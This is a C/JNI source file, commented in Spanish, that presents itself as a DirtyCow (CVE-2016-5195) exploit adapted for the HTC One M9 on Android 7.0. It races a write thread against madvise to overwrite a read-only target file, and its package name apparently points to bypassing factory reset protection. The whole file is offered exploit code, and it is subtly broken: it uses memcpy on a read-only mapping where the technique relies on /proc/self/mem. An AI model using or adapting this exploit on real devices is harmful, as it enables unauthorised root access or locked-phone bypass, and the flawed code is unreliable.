/**
 * Implementación del exploit DirtyCow (CVE-2016-5195) para HTC One M9
 * Adaptado específicamente para Android 7.0 Nougat
 */

#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <sys/stat.h>

// Estructura para pasar datos entre hilos
struct thread_info {
    void *map;
    int fd;
    void *replacement;
    size_t replacement_size;
};

// Función para el hilo de escritura
void *write_thread(void *arg) {
    struct thread_info *info = (struct thread_info *)arg;
    
    // Bucle para intentar la escritura repetidamente
    for (int i = 0; i < 10000; i++) {
        memcpy(info->map, info->replacement, info->replacement_size);
        usleep(100);
    }
    
    return NULL;
}

// Función para el hilo de madvise
void *madvise_thread(void *arg) {
    struct thread_info *info = (struct thread_info *)arg;
    
    // Bucle para llamar a madvise repetidamente
    for (int i = 0; i < 10000; i++) {
        madvise(info->map, info->replacement_size, MADV_DONTNEED);
        usleep(100);
    }
    
    return NULL;
}

// Implementación JNI del exploit
JNIEXPORT jint JNICALL Java_com_example_frpdiagnostic_DirtyCowExploit_runExploit(
        JNIEnv *env, jobject thiz, jstring jtarget, jstring jreplacement) {
    
    // Convertir strings de Java a C
    const char *target_path = (*env)->GetStringUTFChars(env, jtarget, 0);
    const char *replacement_path = (*env)->GetStringUTFChars(env, jreplacement, 0);
    
    // Abrir el archivo objetivo
    int fd = open(target_path, O_RDONLY);
    if (fd == -1) {
        return -1;
    }
    
    // Obtener el tamaño del archivo
    struct stat st;
    if (fstat(fd, &st) == -1) {
        close(fd);
        return -2;
    }
    size_t file_size = st.st_size;
    
    // Mapear el archivo en memoria
    void *map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) {
        close(fd);
        return -3;
    }
    
    // Leer el archivo de reemplazo
    int replacement_fd = open(replacement_path, O_RDONLY);
    if (replacement_fd == -1) {
        munmap(map, file_size);
        close(fd);
        return -4;
    }
    
    // Obtener el tamaño del archivo de reemplazo
    if (fstat(replacement_fd, &st) == -1) {
        close(replacement_fd);
        munmap(map, file_size);
        close(fd);
        return -5;
    }
    size_t replacement_size = st.st_size;
    
    // Leer el contenido del archivo de reemplazo
    void *replacement = malloc(replacement_size);
    if (replacement == NULL) {
        close(replacement_fd);
        munmap(map, file_size);
        close(fd);
        return -6;
    }
    
    ssize_t bytes_read = read(replacement_fd, replacement, replacement_size);
    if (bytes_read != replacement_size) {
        free(replacement);
        close(replacement_fd);
        munmap(map, file_size);
        close(fd);
        return -7;
    }
    close(replacement_fd);
    
    // Preparar la información para los hilos
    struct thread_info info;
    info.map = map;
    info.fd = fd;
    info.replacement = replacement;
    info.replacement_size = replacement_size;
    
    // Crear los hilos
    pthread_t write_thread_id, madvise_thread_id;
    if (pthread_create(&write_thread_id, NULL, write_thread, &info) != 0) {
        free(replacement);
        munmap(map, file_size);
        close(fd);
        return -8;
    }
    
    if (pthread_create(&madvise_thread_id, NULL, madvise_thread, &info) != 0) {
        pthread_cancel(write_thread_id);
        free(replacement);
        munmap(map, file_size);
        close(fd);
        return -9;
    }
    
    // Esperar a que los hilos terminen
    pthread_join(write_thread_id, NULL);
    pthread_join(madvise_thread_id, NULL);
    
    // Liberar recursos
    free(replacement);
    munmap(map, file_size);
    close(fd);
    
    // Liberar strings de Java
    (*env)->ReleaseStringUTFChars(env, jtarget, target_path);
    (*env)->ReleaseStringUTFChars(env, jreplacement, replacement_path);
    
    return 0;
}